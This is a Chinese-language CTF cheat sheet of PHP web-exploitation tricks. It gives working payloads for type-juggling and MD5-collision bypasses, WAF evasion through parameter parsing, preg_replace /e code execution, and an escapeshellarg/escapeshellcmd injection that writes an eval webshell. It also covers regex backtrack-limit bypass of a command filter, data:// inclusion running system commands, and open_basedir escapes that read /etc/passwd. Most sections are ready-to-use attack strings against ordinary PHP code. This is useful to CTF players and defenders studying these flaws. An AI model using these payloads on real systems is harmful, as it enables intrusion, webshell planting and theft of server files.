```bash
形如md5[a]==md5[b]可以用md5加密后开头为0e的字符串绕过，0e在php里是科学计数法
也可以用数组绕过如a[],b[]
strcmp也可以用数组绕过
```

### 1.1PHP的字符串解析特性

```bash
1.1PHP的字符串解析特性
这是别人对PHP字符串解析漏洞的理解，
我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：

/news.php?%20news[id%00=42"+AND+1=0–

上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。

PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
1.删除空白符
2.将某些字符转换为下划线（包括空格）

我的理解：
假如waf不允许num变量传递字母：
http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话
那么我们可以在num前加个空格：
http://www.xxx.com/index.php? num = aaaa
这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。
```

### var_dump()

```bash
var_dump()函数可以用ascii码绕过对字符的过滤，比如flag被过滤，可以用var_dump(chr(102).chr(49).chr(97).chr(103))
```

### 弱类型

```php
经典弱类型漏洞
掌握php弱类型比较
php中其中两种比较符号:
==：先将字符串类型转化成相同，再比较
===：先判断两种字符串的类型是否相等，再比较
字符串和数字比较使用==时,字符串会先转换为数字类型再比较
var_dump('a' == 0);//true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0
var_dump('123a' == 123);//true，这里'123a'会被转换为123

var_dump('a123' == 123);//false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。
举例：
var_dump('123a1' == 123);//true
var_dump('1233a' == 123);//false


参考
https://www.cnblogs.com/Mrsm1th/p/6745532.html
```

### 系统命令执行函数替代

```php
<?php `ls` ?>
passthru('ls')
上述代码可以代替system(“系统命令”);
反引号默认为系统执行命令
```

### unicode欺骗

``` php
unicode欺骗字符查询网站
https://unicode-table.com/en/1D2E/
```

### intval()

```bash
若有题目用intval()判断是否回文，如下行例子：
intval($req["number"])=intval(strrev($req["number"]))
则可以利用intval()函数的漏洞 详解：


Intval函数获取变量整数数值
Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。
这个有个应用就是在判断数值是不是回文上，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647。即为回文。


intval($num) < 2020 && intval($num + 1) > 2021
可传入科学计数法 num=1e10
```

### is_numeric()

```bash
is_numeric()
is_numeric()  判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以。
绕过非数字判断
将%00空字符放字符串前面或后面或者将%20空格符放字符串最后，原理：
	is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！
	
	
同时该函数存在sql注入漏洞：
	当用is_numeric()判断传入的参数是否为数字时，可以传入字符串的16进制，也会被判断为数字，所以跟mysql结合时存在sql注入漏洞
当用is_numeric()判断传入的参数是否为数字时，可以传入字符串的16进制，也会被判断为数字，所以跟mysql结合时存在sql注入漏洞
函数漏洞测试代码:
<?php
echo '传入:admin:'.is_numeric('admin');
echo '<hr>';
echo '传入十六进制后的admin:'.is_numeric('0x61646D696E'); //十六进制转化的admin
?>
更多举例：
<?php
echo is_numeric(233333);       # 1
echo is_numeric('233333');    # 1
echo is_numeric(0x233333);    # 1
echo is_numeric('0x233333');   # 1
echo is_numeric('233333abc');  # 0
?>
```

###  switch()

```php
如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型，效果相当于intval函数。
```

### **14.in_array()**

```php
$array=[0,1,2,'3']; 

var_dump(in_array('abc', $array)); //true 被abc被强制类型转换成0
var_dump(in_array('1bc', $array)); //true 被转换成1
在所有php认为是int的地方输入string，都会被强制转换
```

###  escapeshellarg()->escapeshellcmd() 流程

参考链接： https://paper.seebug.org/164/ 

```bash
1 传入的参数是：172.17.0.2' -v -d a=1

2 经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。

3 经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php

4 最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
例如传入（来自[BUUCTF 2018]Online Tool）
' <?php @eval($_POST["cmd"]);?> -oG yjh.php '(两个单引号旁边的空格不能少)
先变成
' ''\'' <?php @eval($_POST["cmd"]);?> -oG yjh.php '\'' '
然后
' ''\\'\' <?php @eval($_POST["cmd"]);?> -oG yjh.php '\\'' '
简化成
' <?php @eval($_POST["cmd"]);?> -oG yjh.php 
```

### md5强比较加强制类型转换绕过

```PHP
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
            echo `$cmd`;
构造：    
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
    
&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

    
 0e215962017 加密前后相等
```

```php
function complex($re, $str) {//re和str是自己传入的。
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',//将我们传入的参数作为正则表达式匹配，需要传入能匹配到后面命令的正则表达式，即等价              $str                                                   // 于.*的语句
    );
}
这里要利用 preg_replace函数在/e 模式下的命令执行漏洞，参考链接
https://www.cesafe.com/html/6999.html
https://xz.aliyun.com/t/2557
这个案例实际上很简单，就是 preg_replace 使用了 /e 模式，导致可以[代码执行](https://www.cesafe.com/tag/代码执行/)，而且该函数的第一个和第三个参数都是我们可以控制的。我们都知道， preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 preg_replace 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 'strtolower("\\1")' 字符串，那这样要如何执行代码呢？

上面的命令执行，相当于 eval('strtolower("\\1");') 结果，当中的 \\1 实际上就是 \1 ，而 \1 在正则表达式中有自己的含义。我们来看看 W3Cschool 中对其的描述：

## 反向引用

对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

所以这里的 \1 实际上指定的是第一个子匹配项，我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： /?.*={${phpinfo()}} ，即 GET 方式传入的参数名为 /?.* ，值为 {${phpinfo()}} 。

1. 原先的语句： preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
2. 变成了语句： preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});
php在get时会将不合法的字符编程下划线_,所以直接传入.*会被替换成_*,
等价payload:\S*=${phpinfo()} 
```

### preg_match正则匹配

```php
1.用数组可以绕过preg_match函数。
2.如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题,如：
<?php
$ip = 'asd 1.1.1.1 abcd'; // 可以绕过
if(!preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/",$ip)) {
  die('error');
} else {
  echo('key...');
}
?>

    
3.正则匹配只能匹配第一行的数据，%0a可以绕过。
```



### 反序列化字符串逃逸漏洞

```php
<?php
//$a = array('123', 'abc', 'defg');
//var_dump(serialize($a));
//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"
$a = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}';
$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";}";i:2;s:4:"defg";}';
var_dump(unserialize($a));
echo "<br>";
var_dump(unserialize($b));
?>
#输出
array(3) { [0]=> string(3) "123" [1]=> string(3) "abc" [2]=> string(4) "defg" }
array(3) { [0]=> string(3) "123" [1]=> string(3) "abc" [2]=> string(5) "qwert" }
```

### strcmp

可用数组绕过

### parse_str变量覆盖

```php
parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 极度不建议 在没有 array参数的情况下使用此函数，并且在 PHP 7.2 中将废弃不设置参数的行为。此函数没有返回值
举例：
<?php
$name = 'admin';
$sex = 'boy';
@parse_str($_GET['a']);
echo $name;
echo "<br>";
echo $sex;
?>
传参a=name=hack1%26sex=hack2(此处%26为&的url编码，测试时不知为何原因不用%26sex会覆盖失败)
输出：
hack1
hack2
```

###  unset()

```php
unset(bar);用来销毁指定的变量，如果变量bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。
```

### _GET

```php
<?php
    $a = urldecode("%fe%fe%fe%fe");
    $b = urldecode("%a1%b9%bb%aa");
    echo $a^$b;

<?php
    echo (is_nan^(6).(4)).(tan^(1).(5))
    
    
${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
#%ff%ff%ff%ff^%a0%b8%ba%ab结果为_GET 同理：
${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=phpinfo


#结果为_GET
```

###  [PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html) 

```php
#[FBCTF2019]RCEService
#正则回溯最大只有1000000，如果回溯次数超过就会返回flase，构造1000000个a，使回溯超过限制就会绕过正则匹配
elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
payload:
    #本题的要求是json格式
    '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'
```

### basename()

例题：[Zer0pts2020]Can you guess it?

1. 从 https://bugs.php.net/bug.php?id=62119 找到了`basename()`函数的一个问题，它会去掉文件名开头的非ASCII值： 

```php
var_dump(basename("xffconfig.php")); // => config.php
var_dump(basename("config.php/xff")); // => config.php
```

2. [`basename`](https://www.php.net/manual/zh/function.basename)可以返回路径中的文件名部分  如果传入`/index.php/config.php/`，则`$_SERVER['PHP_SELF']`返回`/index.php/config.php/`，`basename($_SERVER['PHP_SELF'])`返回`config.php` 

### 绕过addslashes的方式

设置数据库字符为gbk导致宽字节注入
使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入
url解码导致绕过addslashes
base64解码导致绕过addslashes
json编码导致绕过addslashes
没有使用引号保护字符串，直接无视addslashes
使用了stripslashes(去掉了\)
字符替换导致的绕过addslashes
参考
https://bbs.ichunqiu.com/thread-10899-1-1.html

### 反序列化魔术方法

```php
__construct()              在创建对象时自动调用
__destruct()               在销毁对象时自动调用
__call()                   在对象中调用一个不可访问方法时，call() 会被调用
__callStatic()             在静态上下文中调用一个不可访问方法时调用
__get()                    读取不可访问属性的值时会被调用
__set()                    在给不可访问属性赋值时会被调用
__isset()                  当对不可访问属性调用isset() 或empty()时会被调用
__unset()                  当对不可访问属性调用unset() 时会被调用
__sleep()                  serialize()函数会检查类中是否存在一个魔术方法__sleep()，如果存在，该方法会先被调用，然后才执行序列化操作
__wakeup()                 unserialize()函数会检查是否存在一个__wakeup() 方法，如果存在，则会先调用__wakeup方法，预先准备对象需要的资源。
__toString( )              toString()方法用于一个类被当成字符串时应怎样回应。
__invoke()                 当尝试以调用函数的方式调用一个对象时会被自动调用
__set_state()              自PHP 5.1.0起当调用var_export()导出类时，此静态方法会被调用。
__clone()                  当复制完成时，如果定义了__clone() 方法，则新创建的对象(复制生成的对象)中的__clone()方法会被调用，可用于修改属性的值(如果有必要的话)。

```



### .htaccess绕过exif_imagetype()

在.htaccess头部加上预定义。

```php
#define width 1000
#define height 1000
```

### 绕过open_basedir

```php
配合一句话木马payload
?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));
```

###  preg_match(’/…/i’, **$_SERVER[‘QUERY_STRING’]** 

``` 
$_SERVER[‘QUERY_STRING’]不会进行url解码，可用url编码绕过。
```

###   绕过preg_match(....,$_REQUEST)

```
$_REQUEST会解析GET,在解析POST,可以通过post一个新值绕过
```

### parse_url解析漏洞

[[N1CTF 2018]eating_cms](https://blog.csdn.net/fmyyy1/article/details/116712577)

```php
源码如果先对url进行parse_url解析waf，可以构造错误的url使parse_url解析失败从而绕过waf。
例如
    //url: http://127.0.0.1/user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg
    $keywords = ["flag","manage","ffffllllaaaaggg"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                die("hacker");
            if (stristr($v, $token))
                die("hacker");
        }
    }
	echo "success";
在user.php前加上三个/ 导致parse_url解析失败，绕过下面的foreach检测直接执行后面的echo 'success'.

```

```bash
O:1:"A":3:{s:4:"file";s:3:"flagflagflag#";s:10:"weblogfile";s:12:"flflagag.php";}s:10:"weblogfile";s:8:"flflagag.php"
```

### data伪协议

```php
data伪协议可以绕过一些过滤进行文件包含
例如
<?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}//题目来自ctfshow web38
payload=  data://text/plain;base64,PD9waHAgcmVhZGZpbGUoJ2ZsYWcucGhwJyk/Pg== 即可绕过正则匹配
```

data协议还有个特性 若传入的文本是完整的php语句，则相当于执行了该PHP语句。

例如

```php
<?php


//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
payload:   data://text/plain,<?php%20system("cat fl*");?>
data://text/plain 相当于执行了php语句 后面的.php因为前面被闭合所以相当于直接在html页面输出。
```

### in_array

```php
<?php  
    $num = $_GET['num'];
    $arr = [1, 2, 3, 4];
    if(in_array($num, $arr)){
        echo 'yes';
    }
    else{
        echo 'no';
    }
因为弱类型，传入1.php，2.php等输出为yes
```

### and和&&和=

```php
<?php
$a=true and false and false;
var_dump($a);  返回true

$a=true && false && false;
var_dump($a);  返回false
因为and的优先级比=低 所以$a=true and false and false;先执行赋值再进行and逻辑运算
```

### 绕过 open_basedir 

1.利用glob协议文件上传

```php
<?php
  $a = "glob:///*";
  if ( $b = opendir($a) ) {
    while ( ($file = readdir($b)) !== false ) {
      echo "filename:".$file."\n";
    }
    closedir($b);
  }
?>
```

2.命令执行

```php
<?php
mkdir('mi1k7ea');chdir('mi1k7ea');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));echo file_get_contents('/etc/passwd');
```

